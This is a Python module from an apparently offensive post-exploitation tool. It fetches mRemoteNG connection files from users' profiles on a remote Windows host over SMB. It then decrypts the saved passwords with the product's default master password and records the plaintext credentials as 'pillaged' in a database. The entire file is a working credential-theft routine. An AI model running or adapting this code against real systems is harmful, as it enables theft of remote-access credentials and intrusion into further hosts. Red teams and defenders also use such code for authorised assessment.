#!/usr/bin/env python
# coding:utf-8
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#From : https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py

import ntpath
import re

from lib.toolbox import bcolors
import hashlib
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

import xml.etree.ElementTree as ET

## <1.75 key is md5(password) and encryption is CBC
## >=1.75 key is PBKDF2(password) and encryption is GCM
def gcm_decrypt(data, password):
    salt = data[:16]
    nonce = data[16:32]
    ciphertext = data[32:-16]
    tag = data[-16:]
    # TODO: get these values from the config file
    key = hashlib.pbkdf2_hmac('sha1', password, salt, 1000, dklen=32)   # default values
    cipher = AES.new(key, AES.MODE_GCM, nonce)
    cipher.update(salt)
    try:
        plaintext = cipher.decrypt_and_verify(ciphertext, tag).decode()
    except ValueError:
        print('MAC tag not valid, this means the master password is wrong or the crypto values aren\'t default')

    return plaintext

def cbc_decrypt(data, password):
    iv = data[:16]
    ciphertext = data[16:]
    key = hashlib.md5(password).digest()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext), AES.block_size).decode()


class mRemoteNG():
    def __init__(self,smb,myregops,myfileops,logger,options,db,users):
        self.myregops = myregops
        self.myfileops = myfileops
        self.logging = logger
        self.options = options
        self.db = db
        self.users = users
        self.smb = smb
        self.settings={}
        self.settings['EncryptionEngine']='AES'
        self.settings['EncryptionBlockCipherMode'] = 'GCM'
        self.settings['EncryptionKeyDerivationIterations']=1000
        self.default_password = "mR3m"

    def run(self):
        self.get_files()
        #self.process_files()
        #self.decrypt_all()

    def get_files(self):
        self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering mRemoteNG Secrets {bcolors.ENDC}")
        blacklist = ['.', '..']

        user_directories = [("Users\\{username}\\AppData\\Local\\mRemoteNG", ('mRemoteNG.settings','confCons.xml')),#'mRemoteNG.exe.config',
                            ("Users\\{username}\\AppData\\Roaming\\mRemoteNG", ('mRemoteNG.settings','confCons.xml'))]
        machine_directories = [("Program Files (x86)\\mRemoteNG\\", 'mRemoteNG.exe.config'),
                               ("PROGRAMFILES\\mRemoteNG\\", 'mRemoteNG.exe.config'),
                               ]

        for user in self.users:
            self.logging.debug(
                f"[{self.options.target_ip}] Looking for {user.username} ")
            if user.username == 'MACHINE$':
                continue
                #directories_to_use = machine_directories
            else:
                directories_to_use = user_directories

            for info in directories_to_use:
                my_dir, my_mask = info
                tmp_pwd = my_dir.format(username=user.username)
                self.logging.debug(f"[{self.options.target_ip}] Looking for {user.username} files in {tmp_pwd} with mask {my_mask}")
                for mask in my_mask:
                    my_directory = self.myfileops.do_ls(tmp_pwd, mask, display=False)
                    for infos in my_directory:
                        longname, is_directory = infos
                        self.logging.debug("ls returned file %s" % longname)
                        if longname not in blacklist and not is_directory:
                            try:
                                # Downloading file
                                self.localfile = self.myfileops.get_file(ntpath.join(tmp_pwd, longname), allow_access_error=True)
                                self.process_file(self.localfile,user.username)
                            except Exception as ex:
                                self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception in DownloadFile {self.localfile}{bcolors.ENDC}")
                                self.logging.debug(ex)

    def print_infos(self, node,username):
        try:
            name = node.attrib['Name']
            username_ = node.attrib['Domain'] + '\\' + node.attrib['Username']
            destination = node.attrib['Protocol'] + '://' + node.attrib['Hostname'] + ':' + node.attrib['Port']
            encrypted_password = node.attrib['Password']
            encrypted_data = encrypted_password.strip()
            encrypted_data = base64.b64decode(encrypted_data)
            self.logging.debug(
                f"[] {bcolors.OKGREEN} [mRemoteNG] {bcolors.OKBLUE}{name}:{username_} @ {destination} : {encrypted_password}{bcolors.ENDC}")
            if self.settings['EncryptionEngine'] == 'AES':
                if self.settings['EncryptionBlockCipherMode'] == 'CBC':  # <1.75 key is md5(password) and encryption is CBC
                    self.logging.info(
                        f"[] {bcolors.OKGREEN} [mRemoteNG] - Mode CBC detected - Old MremoteVersion - untested ! {bcolors.ENDC}")
                    iv = encrypted_data[:16]
                    ciphertext = encrypted_data[16:]
                    key = hashlib.md5(self.default_password.encode()).digest()
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    plaintext=unpad(cipher.decrypt(ciphertext), AES.block_size).decode()
                    self.logging.info(f"[] {bcolors.OKGREEN} [mRemoteNG] {bcolors.OKBLUE}{username_}:{plaintext} @ {destination}{bcolors.ENDC}")

                    self.db.add_credz(credz_type='MRemoteNG', credz_username=f"{username_}", credz_password=plaintext,
                                      credz_target=str(destination), credz_path=self.localfile,
                                      pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=username)
                elif self.settings['EncryptionBlockCipherMode'] in ['GCM','CMM','EAX']:
                    salt = encrypted_data[:16]
                    associated_data = encrypted_data[:16]
                    nonce = encrypted_data[16:32]
                    ciphertext = encrypted_data[32:-16]
                    tag = encrypted_data[-16:]
                    if ciphertext != b'':
                        key = hashlib.pbkdf2_hmac("sha1", self.default_password.encode(), salt, self.settings['EncryptionKeyDerivationIterations'], dklen=32)
                        if self.settings['EncryptionBlockCipherMode'] == 'GCM':
                            #<1.75 key is md5(password) and encryption is CBC
                            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                        elif self.settings['EncryptionBlockCipherMode'] == 'CCM':
                            self.logging.info(
                                f"[] {bcolors.OKGREEN} [mRemoteNG] - EncryptionBlockCipherMode CCM detected - untested ! {bcolors.ENDC}")
                            cipher = AES.new(key, AES.MODE_CCM, nonce=nonce)
                        elif self.settings['EncryptionBlockCipherMode'] == 'EAX':
                            self.logging.info(
                                f"[] {bcolors.OKGREEN} [mRemoteNG] - Mode EncryptionBlockCipherMode detected - untested ! {bcolors.ENDC}")
                            cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
                        cipher.update(associated_data)
                        plaintext = cipher.decrypt_and_verify(ciphertext, tag).decode('utf8')
                        self.logging.info(
                            f"[] {bcolors.OKGREEN} [mRemoteNG] {bcolors.OKBLUE}{username_}:{plaintext} @ {destination}{bcolors.ENDC}")

                        self.db.add_credz(credz_type='MRemoteNG',credz_username=f"{username_}",credz_password=plaintext,credz_target=str(destination),credz_path=self.localfile,pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=username)
            elif self.settings['EncryptionEngine'] == 'AES': # Older version ?
                self.logging.info(
                    f"[] {bcolors.OKGREEN} [mRemoteNG] - EncryptionEngine != AES - unsupported ! {bcolors.ENDC}")

        except Exception as ex:
            self.logging.debug(
                f"[] {bcolors.WARNING}Exception in mRemoteNG Process Node of {self.localfile}{bcolors.ENDC}")
            self.logging.debug(ex)




    def print_recur(self, node,username):
        if node.tag == 'Node':
            self.print_infos(node,username)
            for elem in list(node):
                try:
                    self.print_recur(elem,username)
                except Exception as ex:
                    self.logging.debug(
                        f"[] {bcolors.WARNING}Exception in mRemoteNG element {elem}{bcolors.ENDC}")
                    self.logging.debug(ex)
                    continue

    def process_file(self,localfile,username):
        try:
            if "confCons.xml" in localfile:
                tree = ET.parse(localfile)
                root = tree.getroot()
                try : #GetConf
                    iter = int(root.attrib['KdfIterations'])
                    self.settings['EncryptionKeyDerivationIterations'] = iter
                    BlockCipherMode = root.attrib['BlockCipherMode']
                    self.settings['EncryptionBlockCipherMode'] = BlockCipherMode
                    EncryptionEngine = root.attrib['EncryptionEngine']
                    self.settings['EncryptionEngine'] = EncryptionEngine
                    FullFileEncryption = root.attrib['FullFileEncryption']
                    self.logging.debug(f"[MRemoteNG] : FullFileEncryption: {FullFileEncryption}")
                    '''if FullFileEncryption == 'true':
                            cypher = base64.b64decode(re.findall('<.*>(.+)</mrng:Connections>', conf)[0])
                            conf = decrypt(mode, cypher, args.password.encode())'''

                except Exception as ex:
                    self.logging.debug(
                        f"[] {bcolors.WARNING}Exception in mRemoteNG ProcessFile {localfile} {bcolors.ENDC}")
                    self.logging.debug(ex)

                for node in list(root):
                    self.print_recur(node,username)
                return 0
            elif 'mRemoteNG.settings' in localfile:
                tree = ET.parse(localfile)
                root = tree.getroot()
                for node in list(root):
                    for val in node:
                        self.get_settings(val)
                return 0
        except Exception as ex:
            self.logging.debug(
                f"[] {bcolors.WARNING}Exception in mRemoteNG ProcessFile {localfile} {bcolors.ENDC}")
            self.logging.debug(ex)

    def get_settings(self,val):
        try:
            if val.get('name') == 'EncryptionEngine':
                self.settings['EncryptionEngine'] = val.text
            elif val.get('name') == 'EncryptionBlockCipherMode':
                self.settings['EncryptionBlockCipherMode'] = val.text
            elif val.get('name') == 'EncryptionKeyDerivationIterations':
                self.settings['EncryptionKeyDerivationIterations'] = int(val.text)
            if val.get('name') == 'DefaultUsername':
                self.settings['DefaultUsername'] = val.text
            elif val.get('name') == 'DefaultDomain':
                self.settings['DefaultDomain'] = val.text
            elif val.get('name') == 'DefaultPassword':
                self.settings['DefaultPassword'] = val.text

            # recupérer les infos
            '''
            <setting name="EncryptionEngine">AES</setting>
            <setting name="EncryptionBlockCipherMode">GCM</setting>
            <setting name="EncryptionKeyDerivationIterations">1000</setting>
            
            <setting name="DefaultUsername">userDomaine</setting>
            <setting name="DefaultDomain">LMyDom</setting>
            <setting name="DefaultPassword">Ct6gc/JSzjRh/25oz0MCldcITaE=</setting>
            '''
        except Exception as ex:
            self.logging.debug(
                f"[] {bcolors.WARNING}Exception in mRemoteNG ProcessFile mRemoteNG.settings {bcolors.ENDC}")
            self.logging.debug(ex)



